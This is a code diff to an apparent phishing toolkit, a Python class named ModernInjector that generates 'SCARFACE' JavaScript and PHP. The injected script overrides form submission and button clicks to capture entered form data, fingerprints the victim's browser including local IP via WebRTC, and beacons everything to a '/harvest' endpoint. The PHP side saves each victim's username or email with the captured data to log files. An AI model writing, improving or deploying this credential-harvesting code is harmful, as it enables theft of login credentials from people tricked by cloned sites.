@@ -26,7 +26,6 @@ class ModernInjector:
 (function() {
     console.log('[SCARFACE] Ultimate beacon loaded');
 
-    // ---- Collect Advanced Client Info ----
     function getClientInfo() {
         var info = {
             userAgent: navigator.userAgent,
@@ -56,7 +55,6 @@ class ModernInjector:
             battery: {}
         };
 
-        // Battery API (if available)
         if (navigator.getBattery) {
             navigator.getBattery().then(function(batt) {
                 info.battery.level = batt.level * 100 + '%';
@@ -66,7 +64,6 @@ class ModernInjector:
             }).catch(function(){});
         }
 
-        // --- Get Local IP via WebRTC (with fallback) ---
         var localIP = null;
         var rtc = new RTCPeerConnection({iceServers:[]});
         rtc.createDataChannel('');
@@ -81,17 +78,13 @@ class ModernInjector:
                 }
             }
         };
-        // Fallback: use hostname or simple IP detection
         setTimeout(function() {
             if (!localIP) {
-                // Use a simple method: try to fetch from a service (optional)
-                // For now, just set to 'unknown'
                 localIP = 'unknown (WebRTC unavailable)';
             }
             info.localIP = localIP;
         }, 1000);
 
-        // Return the info (we'll update localIP later via another call)
         return info;
     }
 
@@ -108,16 +101,13 @@ class ModernInjector:
 
         console.log('[SCARFACE] ✅ CAPTURED:', data);
 
-        // Attach client info
         var clientInfo = getClientInfo();
-        // Send as separate field 'client_info' (we'll have to send it as part of the payload)
         var payload = {
             form_data: data,
             client_info: clientInfo,
             timestamp: new Date().toISOString()
         };
 
-        // Guaranteed delivery on page unload
         var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
         if(navigator.sendBeacon('/harvest', blob)) {
             console.log('[SCARFACE] Beacon sent successfully');
@@ -130,14 +120,12 @@ class ModernInjector:
         }
     }
 
-    // Override native form submit
     var originalSubmit = HTMLFormElement.prototype.submit;
     HTMLFormElement.prototype.submit = function() {
         captureData(this);
         originalSubmit.call(this);
     };
 
-    // Catch button clicks
     document.addEventListener('click', function(e) {
         var btn = e.target.closest('button, div[role="button"], input[type="submit"]');
         if(btn) {
@@ -200,7 +188,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
     $log_dir = '{os.path.join(self.credentials_dir, self.site_name)}';
     if (!file_exists($log_dir)) {{ mkdir($log_dir, 0777, true); }}
     
-    $username = isset($data['form_data']['username']) ? $data['form_data']['username'] : (isset($data['form_data']['email']) ? $data['form_data']['email'] : 'unknown');
+    // Extract username safely
+    $username = 'unknown';
+    if (isset($data['form_data']) && is_array($data['form_data'])) {{
+        if (isset($data['form_data']['username']) && !empty($data['form_data']['username'])) {{
+            $username = $data['form_data']['username'];
+        }} elseif (isset($data['form_data']['email']) && !empty($data['form_data']['email'])) {{
+            $username = $data['form_data']['email'];
+        }}
+    }}
     $username = preg_replace('/[^a-zA-Z0-9._-]/', '_', $username);
     $timestamp = date('Ymd_His') . '_' . substr(microtime(), 2, 3);
     $filename = $log_dir . '/' . $username . '_' . $timestamp . '.json';
